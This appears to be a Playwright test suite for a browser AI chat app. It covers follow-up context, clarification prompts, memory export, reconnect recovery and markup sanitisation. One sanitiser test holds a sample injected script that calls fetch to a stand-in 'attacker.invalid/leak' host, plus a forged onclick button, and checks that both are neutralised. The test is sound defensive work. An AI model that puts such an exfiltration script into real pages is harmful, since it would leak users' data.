import { test, expect } from '@playwright/test';
import { readFile } from 'node:fs/promises';

const png = 'iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR42mNk+A8AAQUBAScY42YAAAAASUVORK5CYII=';
const job = '12345678-1234-1234-1234-123456789abc';
test.use({ serviceWorkers: 'block' });
test.beforeEach(async ({ page }) => {
    await page.addInitScript(() => localStorage.setItem('jarvis_permission_intro_v1', 'true'));
    await page.route('https://**/*', route => route.abort());
    await page.goto('/'); await page.waitForFunction(() => window.__jarvisModernReady);
});

test('opinion follow-ups retain the discussed place and custom tone without rewriting the user question', async ({ page }) => {
    const requests = [];
    await page.route('**/api/chat-groq', route => {
        const body = route.request().postDataJSON();
        if (!body.stream) return route.fulfill({ json: { success: true, response: 'Fictional town setting' } });
        requests.push(body);
        const text = requests.length === 1 ? 'Seabrook is your fictional town, with quiet cafes and walkable streets but no nightlife.' : 'Given your setting, its strength is a calm pace; its limitation is the lack of nightlife.';
        return route.fulfill({ contentType: 'text/event-stream', body: `event: delta\ndata: ${JSON.stringify({ text })}\n\nevent: done\ndata: ${JSON.stringify({ success: true, response: text, provider: 'groq', modelUsed: 'openai/gpt-oss-20b' })}\n\n` });
    });
    await page.evaluate(() => { window.setCustomSystemPrompt('Use a formal tone. No jokes.', false); window.setWebSearchMode('off'); });
    const input = page.locator('#text-input');
    await input.fill('My fictional town Seabrook has quiet cafes, walkable streets, and no nightlife. Summarize this setting.'); await input.press('Enter');
    await expect(page.locator('#request-status')).toHaveText('Response finished.');
    const question = 'What do you think of that place, bro?';
    await input.fill(question); await input.press('Enter');
    await expect(page.locator('#request-status')).toHaveText('Response finished.');
    expect(requests).toHaveLength(2);
    expect(requests[1].message).toBe(question);
    expect(JSON.stringify(requests[1].context)).toContain('Seabrook');
    expect(requests[1].preferences.customSystemPrompt).toBe('Use a formal tone. No jokes.');
    expect(requests[1].webMode).toBe('off');
    expect(requests[1].contextReference?.status).not.toBe('missing');
});

test('vague references travel from the composer to a clarification with original context and preferences', async ({ page }) => {
    const requests = [];
    await page.route('**/api/chat-groq', route => {
        const body = route.request().postDataJSON();
        if (!body?.stream) return route.fulfill({ json: { success: true, response: 'Database comparison' } });
        requests.push(body);
        const text = requests.length === 1 ? '1. Redis: a memory cache.\n2. PostgreSQL: relational storage.' : body.contextReference?.status === 'ambiguous' ? 'Do you mean Redis or PostgreSQL?' : 'PostgreSQL supports access controls and encryption in transit.';
        return route.fulfill({ contentType: 'text/event-stream', body: `event: delta\ndata: ${JSON.stringify({ text })}\n\nevent: done\ndata: ${JSON.stringify({ success: true, response: text, modelUsed: 'openai/gpt-oss-120b', provider: 'groq' })}\n\n` });
    });
    await page.evaluate(() => window.setCustomSystemPrompt('Reply concisely.', false));
    const input = page.locator('#text-input');
    await input.fill('Compare Redis and PostgreSQL.'); await input.press('Enter');
    await expect(page.locator('#request-status')).toHaveText('Response finished.');
    const modelBadge = page.locator('.assistant-model-badge').first();
    await expect(modelBadge).not.toContainText(/\p{Extended_Pictographic}/u);
    await expect(modelBadge).toHaveCSS('background-color', 'rgba(0, 0, 0, 0)');
    await page.evaluate(() => window.setWebSearchMode('force'));
    await input.fill('Is it secure?'); await input.press('Enter');
    await expect(page.locator('.assistant-message-text').last()).toContainText('Do you mean Redis or PostgreSQL?');
    expect(requests).toHaveLength(2);
    expect(requests[1].message).toBe('Is it secure?');
    expect(requests[1].contextReference.status).toBe('ambiguous');
    expect(requests[1].contextReference.candidates.map(item => item.label)).toEqual(['Redis', 'PostgreSQL']);
    expect(requests[1].preferences.customSystemPrompt).toBe('Reply concisely.');
    expect(requests[1].webMode).toBe('off');
    expect(JSON.stringify(requests[1].context)).toContain('relational storage');
    await page.evaluate(() => window.setWebSearchMode('off'));
    await input.fill('PostgreSQL'); await input.press('Enter');
    await expect(page.locator('#request-status')).toHaveText('Response finished.');
    await expect(page.locator('.assistant-message-text').last()).toContainText('PostgreSQL supports');
});

test('generated markup cannot register UI actions or execute preview scripts', async ({ page }) => {
    const result = await page.evaluate(() => {
        const html = window.JarvisMarkupSecurity.sanitizeAssistantMarkup('<button data-ui-static="shell-3" data-ui-bind-click="forged" data-assistant-action="code-run-js" data-block-id="forged" onclick="window.__bad=1">Run</button>');
        return html;
    });
    expect(result).not.toMatch(/data-ui-|data-assistant-action|data-block-id|onclick/);
    const host = page.locator('#security-preview-fixture');
    await page.evaluate(() => {
        const element = document.createElement('div'); element.id = 'security-preview-fixture'; element.className = 'assistant-message-text';
        element.innerHTML = window.JarvisMarkupSecurity.sanitizeAssistantMarkup(window.JarvisMarkdownRenderer.renderMarkdown('```html\n<h1>Safe preview</h1><script>parent.__bad=1;fetch("https://attacker.invalid/leak")</script>\n```'));
        document.getElementById('chat-container').append(element);
    });
    await host.locator('[data-assistant-action="preview-toggle"]').click();
    const frame = host.locator('iframe');
    await expect(frame).toHaveAttribute('sandbox', '');
    await expect.poll(() => frame.evaluate(node => node.srcdoc.includes("default-src 'none'"))).toBe(true);
    expect(await page.evaluate(() => window.__bad)).toBeUndefined();
});

test('owned controls preserve native bubbling without invoking actions twice', async ({ page }) => {
    const result = await page.evaluate(async () => {
        const counts = { child: 0, parent: 0, outside: 0 };
        const host = document.createElement('div');
        const bind = window.JarvisTrustedUI.bindUiEvent;
        host.innerHTML = `<div ${bind('click', function(event) { counts.parent++; event.stopPropagation(); })}><button ${bind('click', function() { counts.child++; })}>Test</button></div>`;
        const outside = () => counts.outside++;
        document.body.addEventListener('click', outside);
        document.body.append(host);
        await new Promise(resolve => queueMicrotask(resolve));
        host.querySelector('button').click();
        host.remove(); document.body.removeEventListener('click', outside);
        return counts;
    });
    expect(result).toEqual({ child: 1, parent: 1, outside: 0 });
});

test('saved-memory export remains bound when its control is rendered conditionally', async ({ page }) => {
    await page.evaluate(() => {
        window.JarvisUnifiedMemory.unifiedMemoryStore.add({ text: 'I prefer concise answers.', category: 'preference' });
        window.showMemoryManager();
    });
    const exportButton = page.locator('#memory-manager-btn-export');
    await expect(exportButton).toBeVisible();
    await expect(exportButton).toHaveText('Export Markdown');
    const downloaded = page.waitForEvent('download');
    await exportButton.click();
    const file = await downloaded;
    expect(file.suggestedFilename()).toMatch(/\.md$/);
    const content = await readFile(await file.path(), 'utf8');
    expect(content).toMatch(/^# Saved Memories/);
    expect(content).toContain('I prefer concise answers.');
});

test('temporary capability failures preserve tools and drafts and recover on reconnect', async ({ page }) => {
    await page.waitForFunction(() => window.JarvisCapabilities.isAvailable('chat'));
    await page.locator('#text-input').fill('Keep this draft.');
    await page.route('**/api/diagnostics', route => route.fulfill({ status: 503, json: { error: 'unavailable' } }));
    await page.evaluate(() => window.JarvisCapabilities.refreshCapabilities());
    expect(await page.evaluate(() => window.JarvisCapabilities.isAvailable('chat'))).toBe(true);
    await expect(page.locator('#text-input')).toHaveValue('Keep this draft.');
    await page.unroute('**/api/diagnostics');
    const request = page.waitForRequest('**/api/diagnostics');
    await page.evaluate(() => dispatchEvent(new Event('online')));
    await request;
    await expect.poll(() => page.evaluate(() => window.JarvisCapabilities.isAvailable('images'))).toBe(true);
});
